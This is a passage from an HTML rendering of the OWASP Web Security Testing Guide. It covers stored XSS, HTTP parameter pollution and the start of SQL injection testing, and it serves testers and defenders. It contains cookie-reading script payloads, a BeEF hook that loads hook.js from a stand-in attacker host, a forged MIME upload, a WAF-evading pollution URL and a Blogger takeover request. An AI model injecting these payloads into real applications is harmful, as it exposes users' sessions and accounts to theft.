            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>Stored <a href="https://owasp.org/www-community/attacks/xss/">Cross-site Scripting (XSS)</a> is the most dangerous type of Cross Site Scripting. Web applications that allow users to store data are potentially exposed to this type of attack. This chapter illustrates examples of stored cross site scripting injection and related exploitation scenarios.</p>
                
                <p>Stored XSS occurs when a web application gathers input from a user which might be malicious, and then stores that input in a data store for later use. The input that is stored is not correctly filtered. As a consequence, the malicious data will appear to be part of the web site and run within the user’s browser under the privileges of the web application. Since this vulnerability typically involves at least two requests to the application, this may also called second-order XSS.</p>
                
                <p>This vulnerability can be used to conduct a number of browser-based attacks including:</p>
                
                <ul>
                  <li>Hijacking another user’s browser</li>
                  <li>Capturing sensitive information viewed by application users</li>
                  <li>Pseudo defacement of the application</li>
                  <li>Port scanning of internal hosts (“internal” in relation to the users of the web application)</li>
                  <li>Directed delivery of browser-based exploits</li>
                  <li>Other malicious activities</li>
                </ul>
                
                <p>Stored XSS does not need a malicious link to be exploited. A successful exploitation occurs when a user visits a page with a stored XSS. The following phases relate to a typical stored XSS attack scenario:</p>
                
                <ul>
                  <li>Attacker stores malicious code into the vulnerable page</li>
                  <li>User authenticates in the application</li>
                  <li>User visits vulnerable page</li>
                  <li>Malicious code is executed by the user’s browser</li>
                </ul>
                
                <p>This type of attack can also be exploited with browser exploitation frameworks such as <a href="https://beefproject.com">BeEF</a> and <a href="http://xss-proxy.sourceforge.net/">XSS Proxy</a>. These frameworks allow for complex JavaScript exploit development.</p>
                
                <p>Stored XSS is particularly dangerous in application areas where users with high privileges have access. When the administrator visits the vulnerable page, the attack is automatically executed by their browser. This might expose sensitive information such as session authorization tokens.</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify stored input that is reflected on the client-side.</li>
                  <li>Assess the input they accept and the encoding that gets applied on return (if any).</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <h3 id="black-box-testing">Black-Box Testing</h3>
                
                <p>The process for identifying stored XSS vulnerabilities is similar to the process described during the <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">testing for reflected XSS</a>.</p>
                
                <h4 id="input-forms">Input Forms</h4>
                
                <p>The first step is to identify all points where user input is stored into the back-end and then displayed by the application. Typical examples of stored user input can be found in:</p>
                
                <ul>
                  <li>User/Profiles page: the application allows the user to edit/change profile details such as first name, last name, nickname, avatar, picture, address, etc.</li>
                  <li>Shopping cart: the application allows the user to store items into the shopping cart which can then be reviewed later</li>
                  <li>File Manager: application that allows upload of files</li>
                  <li>Application settings/preferences: application that allows the user to set preferences</li>
                  <li>Forum/Message board: application that permits exchange of posts among users</li>
                  <li>Blog: if the blog application permits to users submitting comments</li>
                  <li>Log: if the application stores some users input into logs.</li>
                </ul>
                
                <h4 id="analyze-html-code">Analyze HTML Code</h4>
                
                <p>Input stored by the application is normally used in HTML tags, but it can also be found as part of JavaScript content. At this stage, it is fundamental to understand if input is stored and how it is positioned in the context of the page. Differently from reflected XSS, the pen-tester should also investigate any out-of-band channels through which the application receives and stores users input.</p>
                
                <p><strong>Note</strong>: All areas of the application accessible by administrators should be tested to identify the presence of any data submitted by users.</p>
                
                <p><strong>Example</strong>: Email stored data in <code class="language-plaintext highlighter-rouge">index2.php</code></p>
                
                
                <p>The HTML code of index2.php where the email value is located:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"inputbox"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">value=</span><span class="s">"aaa@aa.com"</span> <span class="nt">/&gt;</span>
                </code></pre></div></div>
                
                <p>In this case, the tester needs to find a way to inject code outside the <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> tag as below:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"inputbox"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">value=</span><span class="s">"aaa@aa.com"</span><span class="nt">&gt;</span> MALICIOUS CODE <span class="c">&lt;!-- /&gt;
                </span></code></pre></div></div>
                
                <h4 id="testing-for-stored-xss">Testing for Stored XSS</h4>
                
                <p>This involves testing the input validation and filtering controls of the application. Basic injection examples in this case:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">aaa@aa.com&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;</code></li>
                  <li><code class="language-plaintext highlighter-rouge">aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E</code></li>
                </ul>
                
                <p>Ensure the input is submitted through the application. This normally involves disabling JavaScript if client-side security controls are implemented or modifying the HTTP request with a web proxy. It is also important to test the same injection with both HTTP GET and POST requests. The above injection results in a popup window containing the cookie values.</p>
                
                <blockquote>
            
                  <p>The HTML code following the injection:</p>
                
                  <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"inputbox"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">size=</span><span class="s">"40"</span> <span class="na">value=</span><span class="s">"aaa@aa.com"</span><span class="nt">&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
                </code></pre></div>  </div>
                
                  <p>The input is stored and the XSS payload is executed by the browser when reloading the page. If the input is escaped by the application, testers should test the application for XSS filters. For instance, if the string “SCRIPT” is replaced by a space or by a NULL character then this could be a potential sign of XSS filtering in action. Many techniques exist in order to evade input filters (see <a href="/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting">testing for reflected XSS</a>) chapter). It is strongly recommended that testers refer to <a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion</a> and <a href="https://cybersecurity.wtf/encoder/">Mario</a> XSS Cheat pages, which provide an extensive list of XSS attacks and filtering bypasses. Refer to the whitepapers and tools section for more detailed information.</p>
                </blockquote>
                
                <h4 id="leverage-stored-xss-with-beef">Leverage Stored XSS with BeEF</h4>
                
                <p>Stored XSS can be exploited by advanced JavaScript exploitation frameworks such as <a href="https://www.beefproject.com">BeEF</a> and <a href="http://xss-proxy.sourceforge.net/">XSS Proxy</a>.</p>
                
                <p>A typical BeEF exploitation scenario involves:</p>
                
                <ul>
                  <li>Injecting a JavaScript hook which communicates to the attacker’s browser exploitation framework (BeEF)</li>
                  <li>Waiting for the application user to view the vulnerable page where the stored input is displayed</li>
                  <li>Control the application user’s browser via the BeEF console</li>
                </ul>
                
                <p>The JavaScript hook can be injected by exploiting the XSS vulnerability in the web application.</p>
                
                <p><strong>Example</strong>: BeEF Injection in <code class="language-plaintext highlighter-rouge">index2.php</code>:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aaa@aa.com"&gt;<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">http://attackersite/hook.js</span><span class="nt">&gt;&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>When the user loads the page <code class="language-plaintext highlighter-rouge">index2.php</code>, the script <code class="language-plaintext highlighter-rouge">hook.js</code> is executed by the browser. It is then possible to access cookies, user screenshot, user clipboard, and launch complex XSS attacks.</p>
                
                <blockquote>

                
                  <p>This attack is particularly effective in vulnerable pages that are viewed by many users with different privileges.</p>
                </blockquote>
                
                <h4 id="file-upload">File Upload</h4>
                
                <p>If the web application allows file upload, it is important to check if it is possible to upload HTML content. For instance, if HTML or TXT files are allowed, XSS payload can be injected in the file uploaded. The pen-tester should also verify if the file upload allows setting arbitrary MIME types.</p>
                
                <p>Consider the following HTTP POST request for file upload:</p>
                
                <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/fileupload.aspx</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
                <span class="s">[…]</span>
                <span class="na">Content-Disposition</span><span class="p">:</span> <span class="s">form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"</span>
                <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain</span>
                
                test
                </code></pre></div></div>
                
                <p>This design flaw can be exploited in browser MIME mishandling attacks. For instance, innocuous-looking files like JPG and GIF can contain an XSS payload that is executed when they are loaded by the browser. This is possible when the MIME type for an image such as <code class="language-plaintext highlighter-rouge">image/gif</code> can instead be set to <code class="language-plaintext highlighter-rouge">text/html</code>. In this case the file will be treated by the client browser as HTML.</p>
                
                <p>HTTP POST Request forged:</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
                Content-Type: text/html
                
                <span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
                </code></pre></div></div>
                
                <p>Also consider that Internet Explorer does not handle MIME types in the same way as Mozilla Firefox or other browsers do. For instance, Internet Explorer handles TXT files with HTML content as HTML content. For further information about MIME handling, refer to the whitepapers section at the bottom of this chapter.</p>
                
                <h3 id="gray-box-testing">Gray-Box Testing</h3>
                
                <p>Gray-box testing is similar to black-box testing. In gray-box testing, the pen-tester has partial knowledge of the application. In this case, information regarding user input, input validation controls, and data storage might be known by the pen-tester.</p>
                
                <p>Depending on the information available, it is normally recommended that testers check how user input is processed by the application and then stored into the back-end system. The following steps are recommended:</p>
                
                <ul>
                  <li>Use front-end application and enter input with special/invalid characters</li>
                  <li>Analyze application response(s)</li>
                  <li>Identify presence of input validation controls</li>
                  <li>Access back-end system and check if input is stored and how it is stored</li>
                  <li>Analyze source code and understand how stored input is rendered by the application</li>
                </ul>
                
                <p>If source code is available (as in white-box testing), all variables used in input forms should be analyzed. In particular, programming languages such as PHP, ASP, and JSP make use of predefined variables/functions to store input from HTTP GET and POST requests.</p>
                
                <p>The following table summarizes some special variables and functions to look at when analyzing source code:</p>
                
                <table>
                  <thead>
                    <tr>
                      <th><strong>PHP</strong></th>
                      <th><strong>ASP</strong></th>
                      <th><strong>JSP</strong></th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td><code class="language-plaintext highlighter-rouge">$_GET</code> - HTTP GET variables</td>
                      <td><code class="language-plaintext highlighter-rouge">Request.QueryString</code> - HTTP GET</td>
                      <td><code class="language-plaintext highlighter-rouge">doGet</code>, <code class="language-plaintext highlighter-rouge">doPost</code> servlets - HTTP GET and POST</td>
                    </tr>
                    <tr>
                      <td><code class="language-plaintext highlighter-rouge">$_POST</code> - HTTP POST variables</td>
                      <td><code class="language-plaintext highlighter-rouge">Request.Form</code> - HTTP POST</td>
                      <td><code class="language-plaintext highlighter-rouge">request.getParameter</code> - HTTP GET/POST variables</td>
                    </tr>
                    <tr>
                      <td><code class="language-plaintext highlighter-rouge">$_REQUEST</code> – HTTP POST, GET and COOKIE variables</td>
                      <td><code class="language-plaintext highlighter-rouge">Server.CreateObject</code> - used to upload files</td>
                      <td>&nbsp;</td>
                    </tr>
                    <tr>
                      <td><code class="language-plaintext highlighter-rouge">$_FILES</code> - HTTP File Upload variables</td>
                      <td>&nbsp;</td>
                      <td>&nbsp;</td>
                    </tr>
                  </tbody>
                </table>
                
                <p><strong>Note</strong>: The table above is only a summary of the most important parameters but, all user input parameters should be investigated.</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://cybersecurity.wtf/encoder/">PHP Charset Encoder(PCE)</a> helps you encode arbitrary texts to and from 65 kinds of character sets that you can use in your customized payloads.</li>
                  <li><a href="https://hackvertor.co.uk/public">Hackvertor</a> is an online tool which allows many types of encoding and obfuscation of JavaScript (or any string input).</li>
                  <li><a href="https://www.beefproject.com">BeEF</a> is the browser exploitation framework. A professional tool to demonstrate the real-time impact of browser vulnerabilities.</li>
                  <li><a href="http://xss-proxy.sourceforge.net/">XSS-Proxy</a> is an advanced Cross-Site-Scripting (XSS) attack tool.</li>
                  <li><a href="https://portswigger.net/burp/">Burp Proxy</a> is an interactive HTTP/S proxy server for attacking and testing web applications.</li>
                  <li><a href="https://www.greasespot.net/">XSS Assistant</a> Greasemonkey script that allow users to easily test any web application for cross-site-scripting flaws.</li>
                  <li><a href="https://www.zaproxy.org">OWASP Zed Attack Proxy (ZAP)</a> is an interactive HTTP/S proxy server for attacking and testing web applications with a built-in scanner.</li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <h3 id="owasp-resources">OWASP Resources</h3>
                
                <ul>
                  <li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">XSS Filter Evasion Cheat Sheet</a></li>
                </ul>
                
                <h3 id="books">Books</h3>
                
                <ul>
                  <li>Joel Scambray, Mike Shema, Caleb Sima - “Hacking Exposed Web Applications”, Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0</li>
                  <li>Dafydd Stuttard, Marcus Pinto - “The Web Application’s Handbook - Discovering and Exploiting Security Flaws”, 2008, Wiley, ISBN 978-0-470-17077-9</li>
                  <li>Jeremiah Grossman, Robert “RSnake” Hansen, Petko “pdp” D. Petkov, Anton Rager, Seth Fogie - “Cross Site Scripting Attacks: XSS Exploits and Defense”, 2007, Syngress, ISBN-10: 1-59749-154-3</li>
                </ul>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186">CERT: “CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests”</a></li>
                  <li><a href="https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf">Amit Klein: “Cross-site Scripting Explained”</a></li>
                  <li><a href="http://www.technicalinfo.net/papers/CSS.html">Gunter Ollmann: “HTML Code Injection and Cross-site Scripting”</a></li>
                  <li><a href="https://www.cgisecurity.com/xss-faq.html">CGISecurity.com: “The Cross Site Scripting FAQ”</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv3Modal" tabindex="-1" role="dialog" aria-labelledby="inpv3ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv3ModalLabel">WSTG-INPV-03 - Testing for HTTP Verb Tampering</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <p>This content has been merged into: Test HTTP Methods</p>
            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv4Modal" tabindex="-1" role="dialog" aria-labelledby="inpv4ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv4ModalLabel">WSTG-INPV-04 - Testing for HTTP Parameter Pollution</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>HTTP Parameter Pollution tests the applications response to receiving multiple HTTP parameters with the same name; for example, if the parameter <code class="language-plaintext highlighter-rouge">username</code> is included in the GET or POST parameters twice.</p>
                
                <p>Supplying multiple HTTP parameters with the same name may cause an application to interpret values in unanticipated ways. By exploiting these effects, an attacker may be able to bypass input validation, trigger application errors or modify internal variables values. As HTTP Parameter Pollution (in short <em>HPP</em>) affects a building block of all web technologies, server and client-side attacks exist.</p>
                
                <p>Current HTTP standards do not include guidance on how to interpret multiple input parameters with the same name. For instance, <a href="https://www.ietf.org/rfc/rfc3986.txt">RFC 3986</a> simply defines the term <em>Query String</em> as a series of field-value pairs and <a href="https://www.ietf.org/rfc/rfc2396.txt">RFC 2396</a> defines classes of reversed and unreserved query string characters. Without a standard in place, web application components handle this edge case in a variety of ways (see the table below for details).</p>
                
                <p>By itself, this is not necessarily an indication of vulnerability. However, if the developer is not aware of the problem, the presence of duplicated parameters may produce an anomalous behavior in the application that can be potentially exploited by an attacker. As often in security, unexpected behaviors are a usual source of weaknesses that could lead to HTTP Parameter Pollution attacks in this case. To better introduce this class of vulnerabilities and the outcome of HPP attacks, it is interesting to analyze some real-life examples that have been discovered in the past.</p>
                
                <h3 id="input-validation-and-filters-bypass">Input Validation and Filters Bypass</h3>
                
                <p>In 2009, immediately after the publication of the first research on HTTP Parameter Pollution, the technique received attention from the security community as a possible way to bypass web application firewalls.</p>
                
                <p>One of these flaws, affecting <em>ModSecurity SQL Injection Core Rules</em>, represents a perfect example of the impedance mismatch between applications and filters. The ModSecurity filter would correctly apply a deny list for the following string: <code class="language-plaintext highlighter-rouge">select 1,2,3 from table</code>, thus blocking this example URL from being processed by the web server: <code class="language-plaintext highlighter-rouge">/index.aspx?page=select 1,2,3 from table</code>. However, by exploiting the concatenation of multiple HTTP parameters, an attacker could cause the application server to concatenate the string after the ModSecurity filter already accepted the input. As an example, the URL <code class="language-plaintext highlighter-rouge">/index.aspx?page=select 1&amp;page=2,3</code> from table would not trigger the ModSecurity filter, yet the application layer would concatenate the input back into the full malicious string.</p>
                
                <p>Another HPP vulnerability turned out to affect <em>Apple Cups</em>, the well-known printing system used by many UNIX systems. Exploiting HPP, an attacker could easily trigger a Cross-Site Scripting vulnerability using the following URL: <code class="language-plaintext highlighter-rouge">http://127.0.0.1:631/admin/?kerberos=onmouseover=alert(1)&amp;kerberos</code>. The application validation checkpoint could be bypassed by adding an extra <code class="language-plaintext highlighter-rouge">kerberos</code> argument having a valid string (e.g. empty string). As the validation checkpoint would only consider the second occurrence, the first <code class="language-plaintext highlighter-rouge">kerberos</code> parameter was not properly sanitized before being used to generate dynamic HTML content. Successful exploitation would result in JavaScript code execution under the context of the hosting web site.</p>
                
                <h3 id="authentication-bypass">Authentication Bypass</h3>
                
                <p>An even more critical HPP vulnerability was discovered in <em>Blogger</em>, the popular blogging platform. The bug allowed malicious users to take ownership of the victim’s blog by using the following HTTP request (<code class="language-plaintext highlighter-rouge">https://www.blogger.com/add-authors.do</code>):</p>
                
                <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /add-authors.do HTTP/1.1
                [...]
                
                security_token=attackertoken<span class="err">&amp;</span>blogID=attackerblogidvalue<span class="err">&amp;</span>blogID=victimblogidvalue<span class="err">&amp;</span>authorsList=goldshlager19test%40gmail.com(attacker email)<span class="err">&amp;</span>ok=Invite
                </code></pre></div></div>
                
                <p>The flaw resided in the authentication mechanism used by the web application, as the security check was performed on the first <code class="language-plaintext highlighter-rouge">blogID</code> parameter, whereas the actual operation used the second occurrence.</p>
                
                <h3 id="expected-behavior-by-application-server">Expected Behavior by Application Server</h3>
                
                <p>The following table illustrates how different web technologies behave in presence of multiple occurrences of the same HTTP parameter.</p>
                
                <p>Given the URL and querystring: <code class="language-plaintext highlighter-rouge">http://example.com/?color=red&amp;color=blue</code></p>
                
                <table>
                  <thead>
                    <tr>
                      <th>Web Application Server Backend</th>
                      <th>Parsing Result</th>
                      <th>Example</th>
                    </tr>
                  </thead>
                  <tbody>
                    <tr>
                      <td>ASP.NET / IIS</td>
                      <td>All occurrences concatenated with a comma</td>
                      <td>color=red,blue</td>
                    </tr>
                    <tr>
                      <td>ASP / IIS</td>
                      <td>All occurrences concatenated with a comma</td>
                      <td>color=red,blue</td>
                    </tr>
                    <tr>
                      <td>PHP / Apache</td>
                      <td>Last occurrence only</td>
                      <td>color=blue</td>
                    </tr>
                    <tr>
                      <td>PHP / Zeus</td>
                      <td>Last occurrence only</td>
                      <td>color=blue</td>
                    </tr>
                    <tr>
                      <td>JSP, Servlet / Apache Tomcat</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>JSP, Servlet / Oracle Application Server 10g</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>JSP, Servlet / Jetty</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>IBM Lotus Domino</td>
                      <td>Last occurrence only</td>
                      <td>color=blue</td>
                    </tr>
                    <tr>
                      <td>IBM HTTP Server</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>mod_perl, libapreq2 / Apache</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>Perl CGI / Apache</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>mod_wsgi (Python) / Apache</td>
                      <td>First occurrence only</td>
                      <td>color=red</td>
                    </tr>
                    <tr>
                      <td>Python / Zope</td>
                      <td>All occurrences in List data type</td>
                      <td>color=[‘red’,’blue’]</td>
                    </tr>
                  </tbody>
                </table>
                
                <p>(source: <a href="https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf">Appsec EU 2009 Carettoni &amp; Paola</a>)</p>
                
                <h2 id="test-objectives">Test Objectives</h2>
                
                <ul>
                  <li>Identify the backend and the parsing method used.</li>
                  <li>Assess injection points and try bypassing input filters using HPP.</li>
                </ul>
                
                <h2 id="how-to-test">How to Test</h2>
                
                <p>Luckily, because the assignment of HTTP parameters is typically handled via the web application server, and not the application code itself, testing the response to parameter pollution should be standard across all pages and actions. However, as in-depth business logic knowledge is necessary, testing HPP requires manual testing. Automatic tools can only partially assist auditors as they tend to generate too many false positives. In addition, HPP can manifest itself in client-side and server-side components.</p>
                
                <h3 id="server-side-hpp">Server-Side HPP</h3>
                
                <p>To test for HPP vulnerabilities, identify any form or action that allows user-supplied input. Query string parameters in HTTP GET requests are easy to tweak in the navigation bar of the browser. If the form action submits data via POST, the tester will need to use an intercepting proxy to tamper with the POST data as it is sent to the server. Having identified a particular input parameter to test, one can edit the GET or POST data by intercepting the request, or change the query string after the response page loads. To test for HPP vulnerabilities simply append the same parameter to the GET or POST data but with a different value assigned.</p>
                
                <p>For example: if testing the <code class="language-plaintext highlighter-rouge">search_string</code> parameter in the query string, the request URL would include that parameter name and value:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/?search_string=kittens
                </code></pre></div></div>
                
                <p>The particular parameter might be hidden among several other parameters, but the approach is the same; leave the other parameters in place and append the duplicate:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/?mode=guest&amp;search_string=kittens&amp;num_results=100
                </code></pre></div></div>
                
                <p>Append the same parameter with a different value:</p>
                
                <div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://example.com/?mode=guest&amp;search_string=kittens&amp;num_results=100&amp;search_string=puppies
                </code></pre></div></div>
                
                <p>and submit the new request.</p>
                
                <p>Analyze the response page to determine which value(s) were parsed. In the above example, the search results may show <code class="language-plaintext highlighter-rouge">kittens</code>, <code class="language-plaintext highlighter-rouge">puppies</code>, some combination of both (<code class="language-plaintext highlighter-rouge">kittens,puppies</code> or <code class="language-plaintext highlighter-rouge">kittens~puppies</code> or <code class="language-plaintext highlighter-rouge">['kittens','puppies']</code>), may give an empty result, or error page.</p>
                
                <p>This behavior, whether using the first, last, or combination of input parameters with the same name, is very likely to be consistent across the entire application. Whether or not this default behavior reveals a potential vulnerability depends on the specific input validation and filtering specific to a particular application. As a general rule: if existing input validation and other security mechanisms are sufficient on single inputs, and if the server assigns only the first or last polluted parameters, then parameter pollution does not reveal a vulnerability. If the duplicate parameters are concatenated, different web application components use different occurrences or testing generates an error, there is an increased likelihood of being able to use parameter pollution to trigger security vulnerabilities.</p>
                
                <p>A more in-depth analysis would require three HTTP requests for each HTTP parameter:</p>
                
                <ol>
                  <li>Submit an HTTP request containing the standard parameter name and value, and record the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=val1</code></li>
                  <li>Replace the parameter value with a tampered value, submit and record the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=HPP_TEST1</code></li>
                  <li>Send a new request combining step (1) and (2). Again, save the HTTP response. E.g. <code class="language-plaintext highlighter-rouge">page?par1=val1&amp;par1=HPP_TEST1</code></li>
                  <li>Compare the responses obtained during all previous steps. If the response from (3) is different from (1) and the response from (3) is also different from (2), there is an impedance mismatch that may be eventually abused to trigger HPP vulnerabilities.</li>
                </ol>
                
                <p>Crafting a full exploit from a parameter pollution weakness is beyond the scope of this text. See the references for examples and details.</p>
                
                <h3 id="client-side-hpp">Client-Side HPP</h3>
                
                <p>Similarly to server-side HPP, manual testing is the only reliable technique to audit web applications in order to detect parameter pollution vulnerabilities affecting client-side components. While in the server-side variant the attacker leverages a vulnerable web application to access protected data or to perform actions that either not permitted or not supposed to be executed, client-side attacks aim at subverting client-side components and technologies.</p>
                
                <p>To test for HPP client-side vulnerabilities, identify any form or action that allows user input and shows a result of that input back to the user. A search page is ideal, but a login box might not work (as it might not show an invalid username back to the user).</p>
                
                <p>Similarly to server-side HPP, pollute each HTTP parameter with <code class="language-plaintext highlighter-rouge">%26HPP_TEST</code> and look for <em>url-decoded</em> occurrences of the user-supplied payload:</p>
                
                <ul>
                  <li><code class="language-plaintext highlighter-rouge">&amp;HPP_TEST</code></li>
                  <li><code class="language-plaintext highlighter-rouge">&amp;amp;HPP_TEST</code></li>
                  <li>etc.</li>
                </ul>
                
                <p>In particular, pay attention to responses having HPP vectors within <code class="language-plaintext highlighter-rouge">data</code>, <code class="language-plaintext highlighter-rouge">src</code>, <code class="language-plaintext highlighter-rouge">href</code> attributes or forms actions. Again, whether or not this default behavior reveals a potential vulnerability depends on the specific input validation, filtering and application business logic. In addition, it is important to notice that this vulnerability can also affect query string parameters used in XMLHttpRequest (XHR), runtime attribute creation and other plugin technologies (e.g. Adobe Flash’s flashvars variables).</p>
                
                <h2 id="tools">Tools</h2>
                
                <ul>
                  <li><a href="https://www.zaproxy.org">OWASP ZAP Passive/Active Scanners</a></li>
                </ul>
                
                <h2 id="references">References</h2>
                
                <h3 id="whitepapers">Whitepapers</h3>
                
                <ul>
                  <li><a href="https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf">HTTP Parameter Pollution - Luca Carettoni, Stefano di Paola</a></li>
                  <li><a href="https://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html">Client-side HTTP Parameter Pollution Example (Yahoo! Classic Mail flaw) - Stefano di Paola</a></li>
                  <li><a href="https://www.acunetix.com/blog/whitepaper-http-parameter-pollution/">How to Detect HTTP Parameter Pollution Attacks - Chrysostomos Daniel</a></li>
                  <li><a href="https://capec.mitre.org/data/definitions/460.html">CAPEC-460: HTTP Parameter Pollution (HPP) - Evgeny Lebanidze</a></li>
                  <li><a href="http://s3.eurecom.fr/docs/ndss11_hpp.pdf">Automated Discovery of Parameter Pollution Vulnerabilities in Web Applications - Marco Balduzzi, Carmen Torrano Gimenez, Davide Balzarotti, Engin Kirda</a></li>
                </ul>

            </div>
            <div class="modal-footer">
                <a href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" class="btn btn-success" target="_blank">View on owasp.org</a>
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>
</div>

<!-- Modal -->
<div class="modal fade" id="inpv5Modal" tabindex="-1" role="dialog" aria-labelledby="inpv5ModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-xl" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="inpv5ModalLabel">WSTG-INPV-05 - Testing for SQL Injection</h5>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <h2 id="summary">Summary</h2>
                
                <p>SQL injection testing checks if it is possible to inject data into the application so that it executes a user-controlled SQL query in the database. Testers find a SQL injection vulnerability if the application uses user input to create SQL queries without proper input validation. A successful exploitation of this class of vulnerability allows an unauthorized user to access or manipulate data in the database.</p>
                
                <p>An <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL injection</a> attack consists of insertion or “injection” of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.</p>
                
